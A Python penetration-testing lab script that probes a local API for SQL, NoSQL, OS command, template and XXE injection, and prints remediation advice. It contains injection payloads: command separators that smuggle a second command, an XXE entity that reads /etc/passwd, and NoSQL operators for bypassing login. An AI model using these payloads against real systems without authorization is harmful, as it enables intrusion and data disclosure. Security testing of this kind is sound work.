#!/usr/bin/env python3
"""
Critical Lab 3: Modern API Injection Attacks
Industry-Grade API Penetration Testing Framework

This module systematically tests API endpoints for injection vulnerabilities:
1. SQL Injection (Error-Based, Boolean Blind, and Time-Based Delays)
2. NoSQL Operator Injection (MongoDB/Document Store Query Bypasses)
3. Remote OS Command Injection (Chained Separators & Subshells)
4. Server-Side Template Injection / SSTI (Jinja2, Twig, FreeMarker, ERB)
5. XML External Entity & XML Injection (XXE / File Disclosure)
"""

import json
import re
import time
from typing import Any, Dict, List, Optional, Union

import requests


class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


class APIInjectionLab:
    """Automated security testing framework for API injection flaws."""

    def __init__(self, target_url: str, auth_token: str = ""):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "SecOps-APITester/2.0"})
        if auth_token:
            self.session.headers.update({"Authorization": f"Bearer {auth_token}"})
        self.findings: List[Dict[str, Any]] = []

    def log_result(
        self,
        test_name: str,
        vulnerable: bool,
        severity: str,
        impact: str,
        evidence: str,
        remediation: str,
    ):
        status_tag = (
            f"{Colors.RED}[CRITICAL VULNERABILITY]{Colors.RESET}"
            if vulnerable
            else f"{Colors.GREEN}[SECURE]{Colors.RESET}"
        )
        print(f"\n{status_tag} {Colors.BOLD}{test_name}{Colors.RESET}")
        print(f"  ├─ Evidence: {evidence}")

        if vulnerable:
            print(f"  ├─ Severity: {Colors.RED}{severity}{Colors.RESET}")
            print(f"  ├─ Business Impact: {impact}")
            print(f"  └─ Remediation: {Colors.YELLOW}{remediation}{Colors.RESET}")
            self.findings.append(
                {
                    "test": test_name,
                    "severity": severity,
                    "evidence": evidence,
                    "impact": impact,
                    "remediation": remediation,
                }
            )
        else:
            print(f"  └─ Validation: Input properly sanitized, parameterized, or rejected.")

    # ----------------------------------------------------------------------
    # Test 1: SQL Injection (Error-Based & Union)
    # ----------------------------------------------------------------------
    def test_sql_injection_error_based(self, endpoint: str, param: str):
        full_url = f"{self.target_url}{endpoint}"
        print(f"\n{Colors.BLUE}[*] Testing Error-Based & Union SQLi on {endpoint} [{param}]...{Colors.RESET}")

        sql_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL, NULL, @@version--",
            "1' UNION SELECT 1, 'sqli_probe_str', 3-- -",
            "admin'--",
            "\" OR \"\"=\"",
        ]

        sql_error_patterns = [
            r"syntax error in query expression",
            r"mysql_fetch",
            r"pg_query\(\)",
            r"unclosed quotation mark",
            r"sqlite3\.OperationalError",
            r"ORA-00933",
            r"SQLSTATE\[",
        ]

        for payload in sql_payloads:
            try:
                res = self.session.get(full_url, params={param: payload}, timeout=5)
                for pattern in sql_error_patterns:
                    if re.search(pattern, res.text, re.IGNORECASE):
                        self.log_result(
                            test_name=f"Error-Based SQL Injection on '{param}'",
                            vulnerable=True,
                            severity="CRITICAL",
                            impact="Direct database compromise, unauthorized data exfiltration, and potential complete system takeover.",
                            evidence=f"Payload '{payload}' triggered SQL error pattern: {pattern}",
                            remediation="Use parameterized queries / prepared statements (e.g., ORM models or parameterized DB drivers).",
                        )
                        return

                if "sqli_probe_str" in res.text:
                    self.log_result(
                        test_name=f"Union-Based SQL Injection on '{param}'",
                        vulnerable=True,
                        severity="CRITICAL",
                        impact="Full database schema and record exfiltration via UNION reflection.",
                        evidence=f"Reflected probed string via: {payload}",
                        remediation="Ensure all database access strictly uses parameterized prepared statements.",
                    )
                    return

            except requests.RequestException:
                pass

        self.log_result(
            test_name=f"Error-Based SQLi on '{param}'",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="No SQL syntax leakage or reflected UNION signatures observed.",
            remediation="Maintain prepared statements and ORM isolation.",
        )

    # ----------------------------------------------------------------------
    # Test 2: Time-Based Blind SQL Injection
    # ----------------------------------------------------------------------
    def test_sql_injection_time_based(self, endpoint: str, param: str, delay: int = 4):
        full_url = f"{self.target_url}{endpoint}"
        print(f"\n{Colors.BLUE}[*] Testing Time-Based Blind SQLi on {endpoint} [{param}]...{Colors.RESET}")

        # Measure baseline latency first
        try:
            start_baseline = time.time()
            self.session.get(full_url, params={param: "1"}, timeout=5)
            baseline_rtt = time.time() - start_baseline
        except requests.RequestException:
            baseline_rtt = 0.2

        time_payloads = [
            f"1' AND (SELECT pg_sleep({delay}))--",
            f"1' WAITFOR DELAY '0:0:{delay}'--",
            f"1' AND (SELECT SLEEP({delay}))--",
            f"1' AND (SELECT 1 FROM (SELECT(SLEEP({delay})))a)--",
        ]

        for payload in time_payloads:
            try:
                start = time.time()
                self.session.get(full_url, params={param: payload}, timeout=delay + 4)
                elapsed = time.time() - start

                if elapsed >= (baseline_rtt + delay - 0.5):
                    self.log_result(
                        test_name=f"Time-Based Blind SQL Injection on '{param}'",
                        vulnerable=True,
                        severity="CRITICAL",
                        impact="Allows blind data extraction character-by-character through conditional timing delays.",
                        evidence=f"Payload caused execution delay of {elapsed:.2f}s (Baseline RTT: {baseline_rtt:.2f}s).",
                        remediation="Enforce parameterized SQL queries across all dynamic filtering and sorting parameters.",
                    )
                    return
            except requests.Timeout:
                self.log_result(
                    test_name=f"Time-Based Blind SQL Injection (Timeout) on '{param}'",
                    vulnerable=True,
                    severity="CRITICAL",
                    impact="Database execution halted due to injected sleep function.",
                    evidence=f"Payload caused request timeout exceeding {delay + 4}s.",
                    remediation="Use parameterized queries exclusively.",
                )
                return
            except requests.RequestException:
                pass

        self.log_result(
            test_name=f"Time-Based SQLi on '{param}'",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Server response latency remained unaffected by time delay payloads.",
            remediation="Maintain parameterized query structures.",
        )

    # ----------------------------------------------------------------------
    # Test 3: NoSQL Operator Injection (JSON Query Selector Abuse)
    # ----------------------------------------------------------------------
    def test_nosql_injection(self, endpoint: str, field_name: str = "username"):
        full_url = f"{self.target_url}{endpoint}"
        print(f"\n{Colors.BLUE}[*] Testing NoSQL Operator Injection on {endpoint} [{field_name}]...{Colors.RESET}")

        nosql_payloads = [
            {"$ne": "__non_existent_key__"},
            {"$gt": ""},
            {"$regex": "^admin.*"},
            {"$where": "this.username != ''"},
        ]

        for payload in nosql_payloads:
            try:
                # Test direct JSON payload tampering
                body = {field_name: payload, "password": "dummy_password"}
                res = self.session.post(full_url, json=body, timeout=5)

                if res.status_code in [200, 201] and (
                    "token" in res.text or "success" in res.text or "admin" in res.text.lower()
                ):
                    self.log_result(
                        test_name=f"NoSQL Operator Injection on '{field_name}'",
                        vulnerable=True,
                        severity="CRITICAL",
                        impact="Authentication bypass or unauthorized record access via unvalidated NoSQL filter objects.",
                        evidence=f"Server accepted object operator: {json.dumps(payload)} | Status: {res.status_code}",
                        remediation="Strictly validate input schema types (e.g., ensure strings only via Pydantic/Joi) and sanitize query objects.",
                    )
                    return
            except requests.RequestException:
                pass

        self.log_result(
            test_name=f"NoSQL Injection Defense on '{field_name}'",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Nested NoSQL operators were rejected or cast to literal strings.",
            remediation="Maintain strict data type validation schemas.",
        )

    # ----------------------------------------------------------------------
    # Test 4: OS Command Injection
    # ----------------------------------------------------------------------
    def test_command_injection(self, endpoint: str, param: str):
        full_url = f"{self.target_url}{endpoint}"
        print(f"\n{Colors.BLUE}[*] Testing OS Command Injection on {endpoint} [{param}]...{Colors.RESET}")

        cmd_payloads = [
            "; echo SEC_CMD_VULN",
            "| echo SEC_CMD_VULN",
            "& echo SEC_CMD_VULN",
            "`echo SEC_CMD_VULN`",
            "$(echo SEC_CMD_VULN)",
            "& ping -c 3 127.0.0.1 &",
        ]

        for payload in cmd_payloads:
            try:
                res = self.session.get(full_url, params={param: f"test_val{payload}"}, timeout=5)
                if "SEC_CMD_VULN" in res.text or "uid=" in res.text:
                    self.log_result(
                        test_name=f"Remote OS Command Injection on '{param}'",
                        vulnerable=True,
                        severity="CRITICAL",
                        impact="Remote Code Execution (RCE) on backend infrastructure with application process privileges.",
                        evidence=f"Reflected command execution stdout with payload: {payload}",
                        remediation="Avoid invoking system shells directly. Use safe APIs (e.g., `subprocess.run` with array arguments, `shell=False`).",
                    )
                    return
            except requests.RequestException:
                pass

        self.log_result(
            test_name=f"Command Injection Defense on '{param}'",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Command chaining delimiters were escaped or rejected.",
            remediation="Maintain shell execution prohibitions.",
        )

    # ----------------------------------------------------------------------
    # Test 5: Server-Side Template Injection (SSTI)
    # ----------------------------------------------------------------------
    def test_template_injection(self, endpoint: str, param: str):
        full_url = f"{self.target_url}{endpoint}"
        print(f"\n{Colors.BLUE}[*] Testing Server-Side Template Injection (SSTI) on {endpoint} [{param}]...{Colors.RESET}")

        ssti_probe = "998244353"  # 499122176 + 499122177
        ssti_payloads = [
            ("{{499122176+499122177}}", "Jinja2 / Twig"),
            ("${499122176+499122177}", "FreeMarker / Spring EL"),
            ("<%= 499122176+499122177 %>", "ERB (Ruby)"),
            ("#{499122176+499122177}", "Thymeleaf / Ruby"),
            ("*{499122176+499122177}", "Spring EL Variable"),
        ]

        for payload, engine in ssti_payloads:
            try:
                res = self.session.get(full_url, params={param: payload}, timeout=5)
                if ssti_probe in res.text:
                    self.log_result(
                        test_name=f"Server-Side Template Injection ({engine}) on '{param}'",
                        vulnerable=True,
                        severity="CRITICAL",
                        impact="Allows arbitrary server-side expression evaluation and can be escalated to Remote Code Execution.",
                        evidence=f"Template expression '{payload}' evaluated mathematically to '{ssti_probe}'.",
                        remediation="Pass variables into templates via context objects rather than concatenating user input directly into template strings.",
                    )
                    return
            except requests.RequestException:
                pass

        self.log_result(
            test_name=f"SSTI Defense on '{param}'",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Template interpolation directives were rendered as plain text strings.",
            remediation="Maintain strict template rendering practices.",
        )

    # ----------------------------------------------------------------------
    # Test 6: XML External Entity (XXE) Injection
    # ----------------------------------------------------------------------
    def test_xxe_injection(self, endpoint: str):
        full_url = f"{self.target_url}{endpoint}"
        print(f"\n{Colors.BLUE}[*] Testing XML External Entity (XXE) Injection on {endpoint}...{Colors.RESET}")

        xxe_payload = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
            '<root><data>&xxe;</data></root>'
        )

        try:
            res = self.session.post(
                full_url,
                data=xxe_payload,
                headers={"Content-Type": "application/xml"},
                timeout=5,
            )
            if "root:x:" in res.text or "/bin/bash" in res.text or "/bin/sh" in res.text:
                self.log_result(
                    test_name="XML External Entity (XXE) Injection",
                    vulnerable=True,
                    severity="CRITICAL",
                    impact="Local file disclosure (LFD), internal network scanning, and Server-Side Request Forgery (SSRF).",
                    evidence=f"Retrieved sensitive file contents via XML parser external entity reference.",
                    remediation="Disable external DTD resolution and entity expansion in XML parser configurations (e.g., `resolve_entities=False`).",
                )
                return
        except requests.RequestException:
            pass

        self.log_result(
            test_name="XXE Injection Defense",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="XML parser rejected external DTD references or processed input securely.",
            remediation="Maintain disabled external entity parsing.",
        )

    # ----------------------------------------------------------------------
    # Harness Execution
    # ----------------------------------------------------------------------
    def run_all(self, target_matrix: List[Dict[str, Any]]):
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD} CRITICAL API INJECTION TESTING SUITE (SQL / NoSQL / Command / SSTI / XXE){Colors.RESET}")
        print(f" Target Host: {self.target_url}")
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")

        for target in target_matrix:
            endpoint = target["endpoint"]
            param = target.get("param", "")
            test_types = target.get("tests", ["sql", "nosql", "cmd", "ssti", "xxe"])

            if "sql" in test_types and param:
                self.test_sql_injection_error_based(endpoint, param)
                self.test_sql_injection_time_based(endpoint, param)
            if "nosql" in test_types and param:
                self.test_nosql_injection(endpoint, param)
            if "cmd" in test_types and param:
                self.test_command_injection(endpoint, param)
            if "ssti" in test_types and param:
                self.test_template_injection(endpoint, param)
            if "xxe" in test_types:
                self.test_xxe_injection(endpoint)

        print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}AUDIT SUMMARY{Colors.RESET}")
        print(f"Total Critical Injection Flaws Discovered: {len(self.findings)}")
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")


if __name__ == "__main__":
    TARGET_HOST = "http://localhost:8080"
    TARGET_MATRIX = [
        {"endpoint": "/api/v1/search", "param": "q", "tests": ["sql", "ssti", "cmd"]},
        {"endpoint": "/api/v1/auth/login", "param": "username", "tests": ["nosql", "sql"]},
        {"endpoint": "/api/v1/documents/parse", "param": "", "tests": ["xxe"]},
    ]

    tester = APIInjectionLab(target_url=TARGET_HOST)
    tester.run_all(TARGET_MATRIX)
